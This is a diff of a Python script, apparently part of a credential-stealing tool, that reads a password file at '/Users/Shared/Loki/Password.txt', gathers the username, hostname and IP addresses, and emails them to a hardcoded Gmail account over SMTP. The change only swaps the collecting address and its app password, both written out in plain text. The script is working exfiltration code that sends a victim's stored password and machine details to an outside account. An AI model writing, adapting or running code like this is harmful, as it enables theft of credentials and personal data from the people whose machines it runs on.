@@ -25,8 +25,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 msg = MIMEMultipart()
-msg['From'] = 'th3ta403@gmail.com'
-msg['To'] = 'th3ta403@gmail.com'
+msg['From'] = '403.th3ta@gmail.com'
+msg['To'] = '403.th3ta@gmail.com'
 msg['Subject'] = socket.gethostname ()
 with open('/Users/Shared/Loki/Password.txt') as f:
     first_line = f.readline ()
@@ -34,9 +34,9 @@ message = getpass.getuser() + "\n" + first_line + "\n" + ipv6 + "\n" + ipv4 + "\
 msg.attach(MIMEText(message))
 
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-server.login("th3ta403@gmail.com", "lqgopscqqfjtjtyx")
+server.login("403.th3ta@gmail.com", "unosryrgbvyjrxib")
 server.sendmail(
-  "th3ta403@gmail.com", 
-  "th3ta403@gmail.com", 
+  "403.th3ta@gmail.com", 
+  "403.th3ta@gmail.com", 
   msg.as_string ())
 server.quit()
